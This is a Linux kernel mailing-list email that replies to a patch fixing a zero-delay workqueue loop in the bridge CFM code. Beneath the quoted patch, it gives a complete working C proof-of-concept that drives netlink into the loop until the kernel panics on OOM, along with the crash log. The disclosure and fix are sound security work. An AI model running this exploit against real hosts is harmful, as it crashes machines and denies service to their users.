Return-Path: <netdev+bounces-271823-lists+netdev=lfdr.de@vger.kernel.org>
Delivered-To: lists+netdev@lfdr.de
Received: from mail.lfdr.de
	by lfdr with LMTP
	id eK50CuurxGnl2AQAu9opvQ
	(envelope-from <netdev+bounces-271823-lists+netdev=lfdr.de@vger.kernel.org>)
	for <lists+netdev@lfdr.de>; Thu, 26 Mar 2026 04:45:47 +0100
X-Original-To: lists+netdev@lfdr.de
Received: from sea.lore.kernel.org (sea.lore.kernel.org [172.234.253.10])
	by mail.lfdr.de (Postfix) with ESMTPS id 77F3A32EE4B
	for <lists+netdev@lfdr.de>; Thu, 26 Mar 2026 04:45:46 +0100 (CET)
Received: from smtp.subspace.kernel.org (conduit.subspace.kernel.org [100.90.174.1])
	by sea.lore.kernel.org (Postfix) with ESMTP id 8C48C301E3D4
	for <lists+netdev@lfdr.de>; Thu, 26 Mar 2026 03:44:20 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id 9CB3A3537C7;
	Thu, 26 Mar 2026 03:44:19 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b="Sy7HdWCr"
X-Original-To: netdev@vger.kernel.org
Received: from mail-dy1-f180.google.com (mail-dy1-f180.google.com [74.125.82.180])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id C2CBC25EF9C
	for <netdev@vger.kernel.org>; Thu, 26 Mar 2026 03:44:17 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.82.180
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1774496659; cv=none; b=S49Mo2X49OEjoxC/uyJkD4GjBVSpP+39HibszI6kVUpee2fUrIDQmSjbb4f6OUtMTSN+I6Kl7LFi0sYwxkZNNPBzQyN/oBmwvcKhtiw3D+Bh6i1rIEVsUWQVFm2rKnUDTD3MlEBwOqS2rGphHYZATOOvAzEt/FwmlScxDI6VLr8=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1774496659; c=relaxed/simple;
	bh=BSAVMgAzRiohdPcoRa4MBQYuwGydJcNaw5zvt2howCA=;
	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
	 Content-Type:Content-Disposition:In-Reply-To; b=iJtkRnXH97Z5SEvHqruImujBvekmInzSLMglvvQHYk77JDaYOGR8qIuSJM6Yb5CxBcGgaEBO7dx3QVTU9LD8kUwgGV0ws4JE0g3SdsHSqvrU462Kyv2bcRUuVr3Eo5ltyLDGzGarvbhWOq8IuJlMoHjlnmRMCZr+A16fasAsxQc=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu; spf=pass smtp.mailfrom=asu.edu; dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b=Sy7HdWCr; arc=none smtp.client-ip=74.125.82.180
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=asu.edu
Received: by mail-dy1-f180.google.com with SMTP id 5a478bee46e88-2b4520f6b32so643990eec.0
        for <netdev@vger.kernel.org>; Wed, 25 Mar 2026 20:44:17 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=asu.edu; s=google; t=1774496657; x=1775101457; darn=vger.kernel.org;
        h=in-reply-to:content-disposition:mime-version:references:message-id
         :subject:cc:to:from:date:from:to:cc:subject:date:message-id:reply-to;
        bh=dZ/apCXV0LiS7el3Xl/L2NFn+NMnNnwPgsLvV+dPaRQ=;
        b=Sy7HdWCrHFGix4JDP12KnNZv8HCmXyi46fyPF1qPc2YABMFef0zLcCPewxbIYmnEme
         BEyhMJigjaVHz4zafkXjw87T9labz9+2zqKNZiYib6e83S0fI3XRVknNtRNUiCl9yX5A
         v1LDuaajMtfVaCJn3GXNBCA7RC6Za0kO4bnR8mSvTphCegp28UN/c3+wbge++/u71JDz
         x/73Hu0WtpYlKljHHbcyfnjjQkhikgoXXNf+hMCAnlvvV7CzClFECQXU4qCd/eE8194z
         t/NNPHe/J+1PI9DCJtlTQlEFPOaOjIIfOCoTTK5FhHz51qb/UT5LnMwgRlWt33W4GRSh
         hNhQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1774496657; x=1775101457;
        h=in-reply-to:content-disposition:mime-version:references:message-id
         :subject:cc:to:from:date:x-gm-gg:x-gm-message-state:from:to:cc
         :subject:date:message-id:reply-to;
        bh=dZ/apCXV0LiS7el3Xl/L2NFn+NMnNnwPgsLvV+dPaRQ=;
        b=h6LWI6LUZzL1Z38qP8mbD5ZF8Yr2vnA24R8SpNCd8PJ1AqHadUTmEzDQVpc2pH9N9i
         nY2WqAQnRBNt+CWHVORbfPB5PPWYGErPT3vt0/Fp/UROoP2VaZ/eHFDS+ugSbXw5PDHU
         RdGGoquXYRwRvw0CEsQ4eTO/bgJcqOupboTXL9ehoC6DHM5sSHQnsn9ECuYwhuTbZddd
         niJsK/AAa70IcmxFaCk2N90BgER5ZK2CI/tf604hQ7uFr6hu28IPQo6X3/yXIkYEbLoQ
         a2j78x7FmUEfLbwDRCeE3mgh7yOM3j9Sk2aaBuKFUc7G6fktyNjAENdL0mi+JvDPqqsn
         cKVQ==
X-Gm-Message-State: AOJu0Yy3/IsjFcd/yQOB+mlfsr4LB4RNjd9Ju1U+D9fNz7hFECpFhZQE
	cpX8xVRu6XLqis7EL7rF2zaoXnK6YgX145XOexRX+cmLVOSVH6OGvx1Xk+7Bn/GJlF6KToQim4y
	2CQ/yRQ==
X-Gm-Gg: ATEYQzxP7pfxzTPcey0RkIagmgkKewBPo45eHPHJhL/bMw+JLEpDPIgXsUVagD7dvg1
	ly5b9itWV9x7y7BDYpR+oBKBs/XQHefDW/Zy0l1S+d+GsTS9ue7ivSJq15EjcKbURxL84tBEvqy
	mxud7fkzpn5GqYKlwBiCH9IjtJSBJZ6rRKlJGQ+J3Nj8lunj3Zih/U8adoxqwJoTmVRz4ycNIuJ
	sblgOsV1UcpfWKEURyBTgLATf8Pxo3xhR46rK0QKZ/mfjNeOpolKDUhthdSuRKDgjpFSJLVCeLt
	mqlQaYLSRVBfZXnyu+HxxMZ1jsXUVmxqidMJIFjDHU0hnzvDXAv5KunniJ0RRTs56bn+go1pAS/
	0FDlQtV3ifzCPj2r7ZV+7WVr/sauFnBjsZAAWKtBIFPYiuXEL5v6hAOQkFJ1CrTsXWnDbT8MtPK
	Xcjr70JX7byjT+7g1tJdj3xBhLkryGQg==
X-Received: by 2002:a05:7300:a943:b0:2b7:a27f:3a6a with SMTP id 5a478bee46e88-2c15d28c39amr2819752eec.4.1774496656335;
        Wed, 25 Mar 2026 20:44:16 -0700 (PDT)
Received: from p1 (209-147-138-15.nat.asu.edu. [209.147.138.15])
        by smtp.gmail.com with ESMTPSA id 5a478bee46e88-2c16edc0473sm1964266eec.20.2026.03.25.20.44.15
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Wed, 25 Mar 2026 20:44:15 -0700 (PDT)
Date: Wed, 25 Mar 2026 20:44:14 -0700
From: Xiang Mei <xmei5@asu.edu>
To: netdev@vger.kernel.org
Cc: bridge@lists.linux.dev, razor@blackwall.org, idosch@nvidia.com, 
	davem@davemloft.net, edumazet@google.com, pabeni@redhat.com, horms@kernel.org, 
	bestswngs@gmail.com
Subject: Re: [PATCH net] bridge: cfm: do not reschedule TX work when interval
 is zero
Message-ID: <vr7a26jt3bhqyf4ngppqlhtyvmqm3wuoqu3gwc4ci2xjzcftpl@rrlagmmfxsri>
References: <20260326031957.3299500-1-xmei5@asu.edu>
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
In-Reply-To: <20260326031957.3299500-1-xmei5@asu.edu>
X-Spamd-Result: default: False [-1.66 / 15.00];
	ARC_ALLOW(-1.00)[subspace.kernel.org:s=arc-20240116:i=1];
	MID_RHS_NOT_FQDN(0.50)[];
	DMARC_POLICY_ALLOW(-0.50)[asu.edu,none];
	R_SPF_ALLOW(-0.20)[+ip4:172.234.253.10:c];
	R_DKIM_ALLOW(-0.20)[asu.edu:s=google];
	MAILLIST(-0.15)[generic];
	MIME_GOOD(-0.10)[text/plain];
	HAS_LIST_UNSUB(-0.01)[];
	FORGED_SENDER_MAILLIST(0.00)[];
	DKIM_TRACE(0.00)[asu.edu:+];
	RCVD_TLS_LAST(0.00)[];
	TAGGED_FROM(0.00)[bounces-271823-lists,netdev=lfdr.de];
	FREEMAIL_CC(0.00)[lists.linux.dev,blackwall.org,nvidia.com,davemloft.net,google.com,redhat.com,kernel.org,gmail.com];
	FORGED_RECIPIENTS_MAILLIST(0.00)[];
	MISSING_XM_UA(0.00)[];
	FROM_HAS_DN(0.00)[];
	MIME_TRACE(0.00)[0:+];
	RCVD_COUNT_FIVE(0.00)[5];
	PRECEDENCE_BULK(0.00)[];
	FROM_NEQ_ENVFROM(0.00)[xmei5@asu.edu,netdev@vger.kernel.org];
	ASN(0.00)[asn:63949, ipnet:172.234.224.0/19, country:SG];
	TO_DN_NONE(0.00)[];
	RCPT_COUNT_SEVEN(0.00)[9];
	NEURAL_HAM(-0.00)[-1.000];
	RCVD_VIA_SMTP_AUTH(0.00)[];
	TAGGED_RCPT(0.00)[netdev];
	DBL_BLOCKED_OPENRESOLVER(0.00)[sea.lore.kernel.org:helo,sea.lore.kernel.org:rdns]
X-Rspamd-Queue-Id: 77F3A32EE4B
X-Rspamd-Action: no action
X-Rspamd-Server: lfdr

On Wed, Mar 25, 2026 at 08:19:57PM -0700, Xiang Mei wrote:
> ccm_tx_work_expired() uses interval_to_us() to convert the configured
> exp_interval enum into a microsecond delay, then passes it to
> queue_delayed_work() to schedule the next iteration. The ccm_tx_dwork
> callback re-arms the same delayed_work struct at the end of each
> invocation, forming a repeating timer.
> 
> interval_to_us() returns 0 for BR_CFM_CCM_INTERVAL_NONE and any
> out-of-range enum value. When this 0 is passed to queue_delayed_work()
> as the delay, the work item fires immediately and re-arms itself with
> zero delay again, creating an infinite tight loop. Each iteration
> allocates an skb via ccm_frame_build() and queues it for transmission.
> The skbs pile up faster than the network stack can free them because the
> worker never yields the CPU, rapidly exhausting all kernel memory until
> OOM deadlock panic.
> 
> Since CC config and CCM TX are independent netlink commands that can be
> issued in any order, there is no single configuration entry point where
> rejecting interval=0 would cover all cases.
> 
> Fix this by checking the interval at the start of ccm_tx_work_expired()
> and stopping transmission immediately if it is zero. Set period to 0 so
> that br_cfm_cc_ccm_tx() correctly sees transmission as stopped and can
> restart it later if a valid interval is configured. This also avoids
> transmitting a CCM frame with an invalid interval value.
> 
> Fixes: a806ad8ee2aa ("bridge: cfm: Kernel space implementation of CFM. CCM frame TX added.")
> Reported-by: Weiming Shi <bestswngs@gmail.com>
> Signed-off-by: Xiang Mei <xmei5@asu.edu>
> ---
>  net/bridge/br_cfm.c | 8 +++++++-
>  1 file changed, 7 insertions(+), 1 deletion(-)
> 
> diff --git a/net/bridge/br_cfm.c b/net/bridge/br_cfm.c
> index 118c7ea48c35..688c51250630 100644
> --- a/net/bridge/br_cfm.c
> +++ b/net/bridge/br_cfm.c
> @@ -274,6 +274,13 @@ static void ccm_tx_work_expired(struct work_struct *work)
>  	del_work = to_delayed_work(work);
>  	mep = container_of(del_work, struct br_cfm_mep, ccm_tx_dwork);
>  
> +	interval_us = interval_to_us(mep->cc_config.exp_interval);
> +	if (!interval_us) {
> +		/* No valid interval - stop transmission */
> +		mep->cc_ccm_tx_info.period = 0;
> +		return;
> +	}
> +
>  	if (time_before_eq(mep->ccm_tx_end, jiffies)) {
>  		/* Transmission period has ended */
>  		mep->cc_ccm_tx_info.period = 0;
> @@ -284,7 +291,6 @@ static void ccm_tx_work_expired(struct work_struct *work)
>  	if (skb)
>  		ccm_frame_tx(skb);
>  
> -	interval_us = interval_to_us(mep->cc_config.exp_interval);
>  	queue_delayed_work(system_percpu_wq, &mep->ccm_tx_dwork,
>  			   usecs_to_jiffies(interval_us));
>  }
> -- 
> 2.43.0
>

Thanks for your attention for this bug.

The following information could help you to reproduce the bug:

Configs:
```
CONFIG_BRIDGE_CFM=y
```

PoC Source Code:
```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/if.h>
#include <linux/if_link.h>
#include <linux/if_bridge.h>

/* if_nametoindex without net/if.h conflict */
extern unsigned int if_nametoindex(const char *ifname);

/* CFM MAID length */
#define CFM_MAID_LENGTH 48

/* CFM enums */
#define BR_CFM_PORT 0
#define BR_CFM_MEP_DIRECTION_DOWN 0
#define BR_CFM_CCM_INTERVAL_NONE 0

/* Netlink helper macros */
#define NLMSG_TAIL(nmsg) \
    ((struct nlattr *)(((void *)(nmsg)) + NLMSG_ALIGN((nmsg)->nlmsg_len)))

static int seq_num = 1;

static int addattr_l(struct nlmsghdr *n, int maxlen, int type,
                     const void *data, int alen)
{
    int len = NLA_HDRLEN + alen;
    struct nlattr *nla;

    if (NLMSG_ALIGN(n->nlmsg_len) + NLA_ALIGN(len) > maxlen)
        return -1;

    nla = NLMSG_TAIL(n);
    nla->nla_type = type;
    nla->nla_len = len;
    if (alen)
        memcpy((void *)nla + NLA_HDRLEN, data, alen);
    n->nlmsg_len = NLMSG_ALIGN(n->nlmsg_len) + NLA_ALIGN(len);
    return 0;
}

static int addattr32(struct nlmsghdr *n, int maxlen, int type, __u32 data)
{
    return addattr_l(n, maxlen, type, &data, sizeof(__u32));
}

static int addattr8(struct nlmsghdr *n, int maxlen, int type, __u8 data)
{
    return addattr_l(n, maxlen, type, &data, sizeof(__u8));
}

static int addattr_str(struct nlmsghdr *n, int maxlen, int type, const char *str)
{
    return addattr_l(n, maxlen, type, str, strlen(str) + 1);
}

static struct nlattr *addattr_nest(struct nlmsghdr *n, int maxlen, int type)
{
    struct nlattr *nest = NLMSG_TAIL(n);
    addattr_l(n, maxlen, type | NLA_F_NESTED, NULL, 0);
    return nest;
}

static void addattr_nest_end(struct nlmsghdr *n, struct nlattr *nest)
{
    nest->nla_len = (void *)NLMSG_TAIL(n) - (void *)nest;
}

static int nl_fd = -1;

static int nl_open(void)
{
    int fd;
    struct sockaddr_nl sa;

    fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
    if (fd < 0) {
        perror("socket(NETLINK_ROUTE)");
        return -1;
    }

    memset(&sa, 0, sizeof(sa));
    sa.nl_family = AF_NETLINK;
    sa.nl_pid = getpid();

    if (bind(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        perror("bind");
        close(fd);
        return -1;
    }

    return fd;
}

static int nl_send_recv(int fd, struct nlmsghdr *nlh)
{
    struct sockaddr_nl sa = { .nl_family = AF_NETLINK };
    struct iovec iov = { .iov_base = nlh, .iov_len = nlh->nlmsg_len };
    struct msghdr msg = {
        .msg_name = &sa,
        .msg_namelen = sizeof(sa),
        .msg_iov = &iov,
        .msg_iovlen = 1,
    };
    char buf[16384];
    struct nlmsghdr *resp;
    int len;

    if (sendmsg(fd, &msg, 0) < 0) {
        perror("sendmsg");
        return -1;
    }

    iov.iov_base = buf;
    iov.iov_len = sizeof(buf);
    len = recvmsg(fd, &msg, 0);
    if (len < 0) {
        perror("recvmsg");
        return -1;
    }

    for (resp = (struct nlmsghdr *)buf; NLMSG_OK(resp, len);
         resp = NLMSG_NEXT(resp, len)) {
        if (resp->nlmsg_type == NLMSG_ERROR) {
            struct nlmsgerr *err = NLMSG_DATA(resp);
            if (err->error) {
                fprintf(stderr, "  netlink error: %s (%d)\n",
                        strerror(-err->error), err->error);
                return err->error;
            }
            return 0;
        }
    }

    return 0;
}

/* Create a network interface via RTM_NEWLINK */
static int create_iface(int fd, const char *name, const char *kind)
{
    char buf[4096];
    struct nlmsghdr *nlh;
    struct ifinfomsg *ifm;
    struct nlattr *linkinfo;

    memset(buf, 0, sizeof(buf));
    nlh = (struct nlmsghdr *)buf;
    nlh->nlmsg_len = NLMSG_LENGTH(sizeof(struct ifinfomsg));
    nlh->nlmsg_type = RTM_NEWLINK;
    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_EXCL;
    nlh->nlmsg_seq = seq_num++;

    ifm = NLMSG_DATA(nlh);
    ifm->ifi_family = AF_UNSPEC;

    addattr_str(nlh, sizeof(buf), IFLA_IFNAME, name);

    linkinfo = addattr_nest(nlh, sizeof(buf), IFLA_LINKINFO);
    addattr_str(nlh, sizeof(buf), IFLA_INFO_KIND, kind);
    addattr_nest_end(nlh, linkinfo);

    return nl_send_recv(fd, nlh);
}

/* Set interface up */
static int set_iface_up(int fd, int ifindex)
{
    char buf[4096];
    struct nlmsghdr *nlh;
    struct ifinfomsg *ifm;

    memset(buf, 0, sizeof(buf));
    nlh = (struct nlmsghdr *)buf;
    nlh->nlmsg_len = NLMSG_LENGTH(sizeof(struct ifinfomsg));
    nlh->nlmsg_type = RTM_NEWLINK;
    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
    nlh->nlmsg_seq = seq_num++;

    ifm = NLMSG_DATA(nlh);
    ifm->ifi_family = AF_UNSPEC;
    ifm->ifi_index = ifindex;
    ifm->ifi_flags = IFF_UP;
    ifm->ifi_change = IFF_UP;

    return nl_send_recv(fd, nlh);
}

/* Set master (enslave port to bridge) */
static int set_master(int fd, int slave_ifindex, int master_ifindex)
{
    char buf[4096];
    struct nlmsghdr *nlh;
    struct ifinfomsg *ifm;

    memset(buf, 0, sizeof(buf));
    nlh = (struct nlmsghdr *)buf;
    nlh->nlmsg_len = NLMSG_LENGTH(sizeof(struct ifinfomsg));
    nlh->nlmsg_type = RTM_NEWLINK;
    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
    nlh->nlmsg_seq = seq_num++;

    ifm = NLMSG_DATA(nlh);
    ifm->ifi_family = AF_UNSPEC;
    ifm->ifi_index = slave_ifindex;

    addattr32(nlh, sizeof(buf), IFLA_MASTER, master_ifindex);

    return nl_send_recv(fd, nlh);
}

/*
 * Send a PF_BRIDGE RTM_SETLINK with IFLA_AF_SPEC containing IFLA_BRIDGE_CFM.
 * The CFM nest contains the specific command nest with its inner attributes.
 */
static int send_cfm_cmd(int fd, int ifindex, int cfm_cmd_type,
                        void (*build_inner)(struct nlmsghdr *, int))
{
    char buf[4096];
    struct nlmsghdr *nlh;
    struct ifinfomsg *ifm;
    struct nlattr *af_spec, *cfm, *cmd;

    memset(buf, 0, sizeof(buf));
    nlh = (struct nlmsghdr *)buf;
    nlh->nlmsg_len = NLMSG_LENGTH(sizeof(struct ifinfomsg));
    nlh->nlmsg_type = RTM_SETLINK;
    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
    nlh->nlmsg_seq = seq_num++;

    ifm = NLMSG_DATA(nlh);
    ifm->ifi_family = AF_BRIDGE;
    ifm->ifi_index = ifindex;

    /* IFLA_AF_SPEC nest */
    af_spec = addattr_nest(nlh, sizeof(buf), IFLA_AF_SPEC);

    /* IFLA_BRIDGE_CFM nest */
    cfm = addattr_nest(nlh, sizeof(buf), IFLA_BRIDGE_CFM);

    /* Command nest (e.g., IFLA_BRIDGE_CFM_MEP_CREATE = 1) */
    cmd = addattr_nest(nlh, sizeof(buf), cfm_cmd_type);
    build_inner(nlh, sizeof(buf));
    addattr_nest_end(nlh, cmd);

    addattr_nest_end(nlh, cfm);
    addattr_nest_end(nlh, af_spec);

    return nl_send_recv(fd, nlh);
}

static int g_port_ifindex;

static void build_mep_create(struct nlmsghdr *nlh, int maxlen)
{
    addattr32(nlh, maxlen, 1, 0);                        /* INSTANCE = 0 */
    addattr32(nlh, maxlen, 2, BR_CFM_PORT);              /* DOMAIN = PORT */
    addattr32(nlh, maxlen, 3, BR_CFM_MEP_DIRECTION_DOWN);/* DIRECTION = DOWN */
    addattr32(nlh, maxlen, 4, g_port_ifindex);           /* IFINDEX */
}

static void build_mep_config(struct nlmsghdr *nlh, int maxlen)
{
    unsigned char mac[6] = {0x00, 0x11, 0x22, 0x33, 0x44, 0x55};
    addattr32(nlh, maxlen, 1, 0);            /* INSTANCE = 0 */
    addattr_l(nlh, maxlen, 2, mac, 6);       /* UNICAST_MAC */
    addattr32(nlh, maxlen, 3, 0);            /* MDLEVEL = 0 */
    addattr32(nlh, maxlen, 4, 1);            /* MEPID = 1 */
}

static void build_cc_config(struct nlmsghdr *nlh, int maxlen)
{
    unsigned char maid[CFM_MAID_LENGTH] = {0};
    addattr32(nlh, maxlen, 1, 0);            /* INSTANCE = 0 */
    addattr32(nlh, maxlen, 2, 1);            /* ENABLE = 1 */
    addattr32(nlh, maxlen, 3, BR_CFM_CCM_INTERVAL_NONE); /* EXP_INTERVAL = 0 */
    addattr_l(nlh, maxlen, 4, maid, CFM_MAID_LENGTH); /* EXP_MAID */
}

static void build_ccm_tx(struct nlmsghdr *nlh, int maxlen)
{
    unsigned char dmac[6] = {0x01, 0x80, 0xc2, 0x00, 0x00, 0x30};
    addattr32(nlh, maxlen, 1, 0);            /* INSTANCE = 0 */
    addattr_l(nlh, maxlen, 2, dmac, 6);      /* DMAC */
    addattr32(nlh, maxlen, 3, 1);            /* SEQ_NO_UPDATE = 1 */
    addattr32(nlh, maxlen, 4, 300);          /* PERIOD = 300 seconds */
    addattr32(nlh, maxlen, 5, 0);            /* IF_TLV = 0 */
    addattr8(nlh, maxlen, 6, 0);             /* IF_TLV_VALUE = 0 */
    addattr32(nlh, maxlen, 7, 0);            /* PORT_TLV = 0 */
    addattr8(nlh, maxlen, 8, 0);             /* PORT_TLV_VALUE = 0 */
}

int main(void)
{
    int fd, ret;
    int br_ifindex;

    printf("[*] CFM zero-delay workqueue DoS PoC\n");

    fd = nl_open();
    if (fd < 0)
        return 1;

    /* Step 1: Create bridge */
    printf("[*] Creating bridge br0...\n");
    ret = create_iface(fd, "br0", "bridge");
    if (ret) {
        fprintf(stderr, "[-] Failed to create bridge: %d\n", ret);
        return 1;
    }

    br_ifindex = if_nametoindex("br0");
    printf("[*] br0 ifindex: %d\n", br_ifindex);

    ret = set_iface_up(fd, br_ifindex);
    if (ret) {
        fprintf(stderr, "[-] Failed to bring up bridge: %d\n", ret);
        return 1;
    }

    /* Step 2: Create dummy port and add to bridge */
    printf("[*] Creating cfmdummy0...\n");
    ret = create_iface(fd, "cfmdummy0", "dummy");
    if (ret) {
        fprintf(stderr, "[-] Failed to create dummy: %d\n", ret);
        return 1;
    }

    g_port_ifindex = if_nametoindex("cfmdummy0");
    printf("[*] dummy0 ifindex: %d\n", g_port_ifindex);

    ret = set_iface_up(fd, g_port_ifindex);
    if (ret) {
        fprintf(stderr, "[-] Failed to bring up dummy: %d\n", ret);
        return 1;
    }

    ret = set_master(fd, g_port_ifindex, br_ifindex);
    if (ret) {
        fprintf(stderr, "[-] Failed to enslave dummy to bridge: %d\n", ret);
        return 1;
    }
    printf("[+] dummy0 enslaved to br0\n");

    /* Step 3: Create CFM MEP on the port */
    printf("[*] Creating CFM MEP (instance 0) on dummy0...\n");
    ret = send_cfm_cmd(fd, g_port_ifindex, 1 /* MEP_CREATE */, build_mep_create);
    if (ret) {
        fprintf(stderr, "[-] MEP create failed: %d\n", ret);
        return 1;
    }
    printf("[+] MEP created\n");

    /* Step 4: Configure MEP */
    printf("[*] Configuring MEP...\n");
    ret = send_cfm_cmd(fd, g_port_ifindex, 3 /* MEP_CONFIG */, build_mep_config);
    if (ret) {
        fprintf(stderr, "[-] MEP config failed: %d\n", ret);
        return 1;
    }
    printf("[+] MEP configured\n");

    /* Step 5: Set CC config with exp_interval=0 and enable=1 */
    printf("[*] Setting CC config (enable=1, exp_interval=0)...\n");
    ret = send_cfm_cmd(fd, g_port_ifindex, 4 /* CC_CONFIG */, build_cc_config);
    if (ret) {
        fprintf(stderr, "[-] CC config failed: %d\n", ret);
        return 1;
    }
    printf("[+] CC config set with zero interval\n");

    /* Step 6: Start CCM transmission - triggers zero-delay loop */
    printf("[*] Starting CCM TX (period=300s) - should trigger soft lockup...\n");
    ret = send_cfm_cmd(fd, g_port_ifindex, 8 /* CC_CCM_TX */, build_ccm_tx);
    if (ret) {
        fprintf(stderr, "[-] CCM TX failed: %d\n", ret);
        return 1;
    }
    printf("[+] CCM TX started - workqueue storm active!\n");

    /* Wait for soft lockup detector */
    printf("[*] Waiting for soft lockup detection (~120 seconds for 2GB RAM)...\n");
    sleep(300);

    printf("[?] Soft lockup didn't trigger panic.\n");

    close(fd);
    return 0;
}
```

The intended crash:
```
[  120.738531] Out of memory: Killed process 142 (su) total-vm:4528kB, anon-rss:388kB, file-rss:4kB, shmem-rss:0kB, UID:0 pgtables:48kB oom_score_0
[  120.744053] Out of memory: Killed process 140 (su) total-vm:4508kB, anon-rss:372kB, file-rss:4kB, shmem-rss:0kB, UID:0 pgtables:52kB oom_score_0
[  120.745038] Out of memory: Killed process 129 (init.sh) total-vm:3992kB, anon-rss:264kB, file-rss:4kB, shmem-rss:0kB, UID:0 pgtables:52kB oom_s0
[  120.748590] Out of memory: Killed process 141 (bash) total-vm:3912kB, anon-rss:248kB, file-rss:4kB, shmem-rss:0kB, UID:0 pgtables:52kB oom_scor0
[  120.751573] Kernel panic - not syncing: System is deadlocked on memory
[  120.751950] CPU: 1 UID: 0 PID: 1 Comm: init Not tainted 7.0.0-rc4+ #5 PREEMPTLAZY
[  120.752360] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS rel-1.17.0-0-gb52ca86e094d-prebuilt.qemu.org 04/01/2014
[  120.752965] Call Trace:
[  120.753112]  <TASK>
[  120.753233]  vpanic+0x694/0x780
[  120.753409]  ? __pfx_vpanic+0x10/0x10
[  120.753615]  ? __pfx__raw_spin_lock+0x10/0x10
[  120.753883]  panic+0xca/0xd0
[  120.754049]  ? __pfx_panic+0x10/0x10
[  120.754251]  ? panic_on_this_cpu+0x1a/0x40
[  120.754455]  out_of_memory+0x124e/0x1350
[  120.754649]  ? __pfx_out_of_memory+0x10/0x10
[  120.754873]  __alloc_pages_slowpath.constprop.0+0x2325/0x2dd0
[  120.755159]  ? __pfx_do_wp_page+0x10/0x10
[  120.755355]  ? __pfx___alloc_pages_slowpath.constprop.0+0x10/0x10
[  120.755659]  ? __alloc_frozen_pages_noprof+0x4f8/0x800
[  120.755926]  __alloc_frozen_pages_noprof+0x4f8/0x800
[  120.756174]  ? __pfx___alloc_frozen_pages_noprof+0x10/0x10
[  120.756421]  ? alloc_pages_mpol+0x13a/0x390
[  120.756627]  ? __pfx_alloc_pages_mpol+0x10/0x10
[  120.756870]  alloc_pages_mpol+0x13a/0x390
[  120.757069]  ? __pfx_alloc_pages_mpol+0x10/0x10
[  120.757294]  ? xas_load+0x18/0x270
[  120.757464]  folio_alloc_noprof+0x16/0xd0
[  120.757651]  filemap_alloc_folio_noprof.part.0+0x1f7/0x350
[  120.757920]  ? __pfx_filemap_alloc_folio_noprof.part.0+0x10/0x10
[  120.758205]  ? page_cache_ra_unbounded+0x351/0x7b0
[  120.758442]  __filemap_get_folio_mpol+0x278/0x4f0
[  120.758684]  filemap_fault+0x10eb/0x2fc0
[  120.758894]  ? __pfx_filemap_fault+0x10/0x10
[  120.759094]  ? recalc_sigpending+0x19b/0x230
[  120.759308]  __do_fault+0xf4/0x6d0
[  120.759485]  do_fault+0x891/0x11f0
[  120.759661]  __handle_mm_fault+0x918/0x1400
[  120.759888]  ? __pfx___handle_mm_fault+0x10/0x10
[  120.760128]  ? __pfx_vma_start_read+0x10/0x10
[  120.760355]  ? __pfx_lock_vma_under_rcu+0x10/0x10
[  120.760590]  handle_mm_fault+0x464/0xc70
[  120.760808]  do_user_addr_fault+0x27b/0xbb0
[  120.761010]  exc_page_fault+0x6b/0xe0
[  120.761193]  asm_exc_page_fault+0x26/0x30
[  120.761388] RIP: 0033:0x59a222f19c30
[  120.761569] Code: Unable to access opcode bytes at 0x59a222f19c06.
[  120.761907] RSP: 002b:00007fff94c6c9b8 EFLAGS: 00010246
[  120.762192] RAX: 0000000000000000 RBX: 000059a222f28b28 RCX: 00007d9b763dfdba
[  120.762532] RDX: 00007fff94c6c9c0 RSI: 00007fff94c6caf0 RDI: 0000000000000011
[  120.762874] RBP: 00007fff94c6d6d0 R08: 0000000000000000 R09: 00007d9b764ed580
[  120.763213] R10: 0000000000000000 R11: 0000000000000246 R12: 000059a222f28b90
[  120.763559] R13: 0000000000000001 R14: 0000000000000000 R15: 00007fff94c6d6cc
[  120.763915]  </TASK>
```

This bug is a DoS bug requiring ns_capable(CAP_NET_ADMIN).
Please let me know if you have any questions for the patch and poc.

Thanks,
Xiang

